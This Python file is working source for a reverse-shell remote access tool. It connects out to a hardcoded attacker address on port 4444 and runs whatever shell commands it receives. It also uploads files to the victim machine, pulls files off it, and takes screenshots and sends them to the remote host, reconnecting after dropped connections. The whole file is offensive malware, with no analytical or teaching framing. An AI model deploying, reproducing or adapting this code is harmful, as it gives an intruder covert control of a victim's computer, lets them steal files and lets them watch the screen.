import socket
import subprocess
import os
from time import sleep
from pyautogui import screenshot

def reverse_shell(attacker_ip, attacker_port):
    max_retries = 15
    retry_count = 0

    while retry_count < max_retries:
        try:
            print(f"[INFO] Attempting to connect... (Attempt {retry_count + 1}/{max_retries})")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((attacker_ip, attacker_port))
            print("[INFO] Connected to the attacker.")
            
            retry_count = 0  # Reset retries after connecting successfully

            while True:
                command = s.recv(1024)
                command = command.decode()

                if command == "":
                    break
                elif command == "exit":
                    s.close()
                    return
                elif command.startswith("upload"):
                    _, filename = command.split(' ', 1)
                    filename = filename.strip()
                    upload_file(s, filename)
                elif command.startswith("download"):
                    _, filename = command.split(' ', 1)
                    filename = filename.strip()
                    print(filename)
                    download_file(s, filename)
                elif command.startswith("screenshot"):
                    take_screenshot(s, "image.png")
                else:
                    output = subprocess.getoutput(command)
                    if output:
                        s.send((output + '\n').encode())

        except (socket.error, BrokenPipeError) as e:
            print(f"[ERROR] Connection lost: {e}. Retrying in 10 seconds.")
            s.close()
            retry_count += 1
            if retry_count < max_retries:
                sleep(10)
            else:
                break



def upload_file(conn, filename):
    try:
        file = open(filename, "wb")
        while True:
            data = conn.recv(1024)
            if data.strip() == b'END':
                print("[DEBUG] Upload finished.")
                break
            file.write(data)
        file.close()
        
        conn.send(b"Upload complete\n")

    except Exception as e:
        conn.send(f"Upload failed: {e}\n".encode())
        print(f"[ERROR] Upload failed: {e}")




def download_file(conn, filepath):
    normalized_path = os.path.normpath(filepath)

    try:
        if os.path.exists(normalized_path):
            file = open(normalized_path, "rb")
            conn.sendall(file.read())
            file.close()
        else:
            conn.send(b"File not found")
    except Exception as e:
        conn.send(f"Download failed: {e}\n".encode())
        print(f"[ERROR] Download failed: {e}")



def take_screenshot(conn, filename):
    try:
        screenshot(filename)
        file = open(filename, 'rb')
        conn.sendall(file.read())
        file.close()
        os.remove(filename)
        conn.send(b"Screenshot captured and sent\n")
    except Exception as e:
        conn.send(f"Screenshot failed: {e}\n".encode())
        print(f"[ERROR] Screenshot failed: {e}")


def run(functions):
    results = {}
    for func_name, params in functions.items():
        try:
            target_function = globals().get(func_name)
            if not callable(target_function):
                results[func_name] = "Function not found"
                print(f"[ERROR] Function '{func_name}' not found.")
                continue
            if isinstance(params, list):
                results[func_name] = target_function(*params)
            else:
                results[func_name] = target_function()
            print(f"[INFO] Executed {func_name}: {results[func_name]}")
        except Exception as e:
            print(f"[ERROR] Failed to execute {func_name}: {e}")
            results[func_name] = f"Error: {e}"
    return {"status": "success", "results": results}


if __name__ == "__main__":
    reverse_shell("192.168.1.26", 4444)
